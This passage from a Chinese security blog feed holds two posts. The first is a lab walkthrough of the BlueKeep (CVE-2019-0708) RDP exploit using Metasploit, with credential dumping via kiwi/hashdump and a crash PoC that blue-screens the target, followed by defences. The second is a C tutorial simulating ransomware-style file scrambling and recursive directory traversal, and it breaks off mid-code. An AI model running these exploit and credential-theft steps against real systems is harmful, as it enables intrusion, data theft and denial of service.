企业版（IP地址：192.168.193.141）</p><p>利用工具：</p><ul><li>MSF</li><li>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></li></ul><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>在靶机中设置远程桌面连接：</p><img src="/posts/2d03ac3f/2.2.1.png" class="" title="设置远程桌面连接"><p>开启公用文件夹共享：</p><img src="/posts/2d03ac3f/2.2.2.png" class="" title="开启公用文件夹共享"><p>在Windows 防火墙开启3389端口：</p><img src="/posts/2d03ac3f/2.2.3.png" class="" title="开启3389端口"><p>在攻击机中更新应用，安装MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><p>有关MSF的知识可以看<a href="https://blog.csdn.net/weixin_45677145/article/details/111540117">MSF详解</a>，Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>扫描靶机IP或扫描内网的存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.193.140</span><br><span class="line">nmap 192.168.193.0/24</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.4.png" class="" title="扫描靶机是否开启3389端口"><p>发现靶机开启了3389端口，猜测可以利用CVE-2019-0708进行攻击。进入MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.5.png" class="" title="进入MSF"><p>在MSF中搜索有关CVE-2019-0708的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve-2019-0708</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.7.png" class="" title="启用模块"><p>得到两个模块，一个是辅助模块，用来扫描靶机是否存在该漏洞且可利用；另一个是漏洞利用模块，用来攻击靶机。</p><p>先利用辅助模块对靶机进行扫描，查看相关信息和设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.6.png" class="" title="启用模块"><p>其中还有一个rhosts参数还没进行设置，将rhosts设置为靶机IP，进行检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.193.140</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞"><p>结果显示靶机存在这个漏洞。</p><h3 id="3-3-1-提权"><a href="#3-3-1-提权" class="headerlink" title="3.3.1 提权"></a>3.3.1 提权</h3><p>使用漏洞利用模块对靶机进行渗透：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">set rhosts 192.168.193.140</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.14.png" class="" title="使用攻击模块进行设置"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.15.png" class="" title="使用攻击模块进行设置"><p>发现目前的攻击脚本只适用于64位版本的 Windows 7 和 Windows 2008 R2 ，到了这里做不下去了，攻击不成功，因为我的 Win 7 靶机是32位的🤣。</p><img src="/posts/2d03ac3f/2.2.16.png" class="" title="使用攻击模块进行设置"><p>速速转到64位版本的 Win 7 重复以上操作，因为我的VMware是15.5的版本，所以选择5，成功提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.17.png" class="" title="成功提权"><h3 id="3-3-2-远程登录"><a href="#3-3-2-远程登录" class="headerlink" title="3.3.2 远程登录"></a>3.3.2 远程登录</h3><p>注意，这个操作在提权成功的情况下才能进行远程登录。将靶机用户设置密码，否则不能远程登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump//获取目标主机hash值</span><br><span class="line">load kiwi//载入kiwi模块，它是一个密码提取神器，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证等</span><br><span class="line">creds_all//获得目标主机的账号密码</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.2.png" class="" title="提取账户密码"><p>远程登录靶机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.193.141 -u Leong -p l30n9ry0n</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.3.png" class="" title="远程登录靶机"><h3 id="3-3-3-蓝屏攻击"><a href="#3-3-3-蓝屏攻击" class="headerlink" title="3.3.3 蓝屏攻击"></a>3.3.3 蓝屏攻击</h3><p>前情提要：使用辅助模块发现靶机存在这个漏洞。</p><p>安装pip3和impacket库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.9.png" class="" title="安装pip3和impacket库"><p>下载POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br></pre></td></tr></table></figure><p>进去该目录看看里面有什么文件以及它们的权限。发现它们没有执行权限。</p><img src="/posts/2d03ac3f/2.2.10.png" class="" title="POC包含的文件"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 crashpoc.py</span><br></pre></td></tr></table></figure><p>chmod表示change mod，修改文件属性；<code>crashpoc.py</code>表示所要修改的文件；777表示权限列表，每个“7”表示一组，共三组。“r—”二进制表示“100”，其值为4；而“rwx”表示“111”，其值为7，即所有权限都开启。</p><img src="/posts/2d03ac3f/2.2.12.png" class="" title="修改文件权限"><p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么要安装impacket库。可用<code>pip3 list</code>命令查看Python安装的所有扩展包。</p><img src="/posts/2d03ac3f/2.2.11.png" class=""><p>利用脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 crashpoc.py 192.168.193.140 32</span><br><span class="line">#IP地址 目标IP地址主机的系统版本</span><br></pre></td></tr></table></figure><p>靶机蓝屏，攻击成功。</p><img src="/posts/2d03ac3f/2.2.13.png" class="" title="靶机蓝屏"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>微软官方已经发布更新补丁(包括Windows XP等停止维护的版本)，请用户及时进行补丁更新</li><li>若用户不需要用到远程桌面服务，建议禁用该服务</li><li>在防火墙中对TCP 3389端口进行阻断</li><li>开启系统防火墙或IP安全策略限制来源IP，即只允许指定IP访问</li><li>启用网络级认证(NLA)，此方案适用于Windows 7 、 Windows Server 2008 和 Windows Server 2008 R2</li><li>安装必要的防火墙或杀毒软件，关注安全公司的漏洞报告或防御文章</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒中的加解密原理</title>
    <link href="http://example.com/posts/5ec21076.html"/>
    <id>http://example.com/posts/5ec21076.html</id>
    <published>2022-05-23T04:53:40.733Z</published>
    <updated>2022-05-24T07:21:14.841Z</updated>
    
    <content type="html"><![CDATA[<p>勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</p><p>现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。</p><span id="more"></span><h1 id="1-对系统文件进行简单加解密"><a href="#1-对系统文件进行简单加解密" class="headerlink" title="1. 对系统文件进行简单加解密"></a>1. 对系统文件进行简单加解密</h1><p>假设桌面存在如下图所示的文件夹“l30n9ry0n”，我们需要获取其信息再进行文件遍历及加密操作，需要用到操作系统API、加密算法，像勒索病毒一样可以还原文件的，还需要解密算法。</p><img src="/posts/5ec21076/1.1.1.png" class=""><p>1.在编写一个简单的加密函数前，首先需要创建文件并执行打开、读写操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName)</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="comment">//1.打开文件</span></span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;r+&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">jiami(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n\\作业.txt&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.2.png" class="" title="实现文件打开操作"><p>2.计算文件大小，查看该文件可知共142字节。</p><img src="/posts/5ec21076/1.1.3.png" class="" title="查看文件大小"><p>在C代码里的基本流程为：</p><ul><li>设置光标(文件指针)到文件末尾</li><li>计算光标距离文件头的字节数</li><li>设置光标位置到文件头(便于后面的加密操作)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;<span class="comment">//文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.4.png" class=""><p>3.循环插入字节实现简单的加密。</p><p>如果在进行文件操作时，遇到权限不够的情况下，需要进行相关的提权操作，再进行加密处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span>* tmp;</span><br><span class="line"><span class="type">int</span> read_size;</span><br><span class="line">tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>((size + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">read_size = fread(tmp, <span class="keyword">sizeof</span>(<span class="type">char</span>), size, fp);</span><br><span class="line">tmp[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//printf(&quot;读取字符串为：%s %d %d\n&quot;, tmp, read_size, strlen(tmp));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span>* pTxt;</span><br><span class="line">FILE* fpw = fopen(<span class="string">&quot;ddd.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);                           <span class="comment">//写入文件</span></span><br><span class="line">pTxt = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (<span class="built_in">strlen</span>(tmp) * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = size; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">ch = tmp[i];</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">pTxt[<span class="number">2</span> * i - <span class="number">1</span>] = code;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%d %c %c\n&quot;, i, ch, pTxt[2 * i - 1]);</span></span><br><span class="line">&#125;</span><br><span class="line">pTxt[size * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作后字符串：%s %d\n&quot;</span>, pTxt, <span class="built_in">strlen</span>(pTxt));</span><br><span class="line">fwrite(pTxt, <span class="keyword">sizeof</span>(<span class="type">char</span>), size * <span class="number">2</span>, fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.5.png" class=""><p>运行完后在C代码当前目录下生成一个<code>ddd.txt</code>文件，发现一个简单的加密或扰乱完成。</p><img src="/posts/5ec21076/1.1.6.png" class=""><p>为什么文件显示的字节与计算的字节不一样？对于文本流，因为会执行行末字符映射，所以文本文件的字节数可能和程序写入的字节数不同。基于此，可以用二进制方式读写文件。同时，使用二进制可以读取大型文件如<code>.exe</code>文件、音视频文件等。</p><p>4.编写一个遍历文件夹的函数，实现对整个目录进行加密处理。</p><p>通常遍历文件夹采用递归，依次遍历某个目录的文件夹，深度搜索文件夹中的内容，如果是文件就加密，如果是文件夹就继续深度搜索，直至找到文件依次返回，从而实现整个目录的文件遍历。</p><ul><li>调用<code>GetCurrentDirectory()</code>函数获取当前目录</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//jiami(&quot;C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt&quot;);</span></span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用<code>FindFirstFile()</code>函数获取目录下第一个文件</li><li>如果找到第一个文件，则循环调用<code>FindNextFile()</code>函数获取下一个文件</li><li>如果找到的是文件夹，则拼接新的文件夹路径继续递归遍历文件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span> (findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//遍历当前目录下的文件</span></span><br><span class="line">findFile(buff);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.7.png" class=""><p>5.完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span 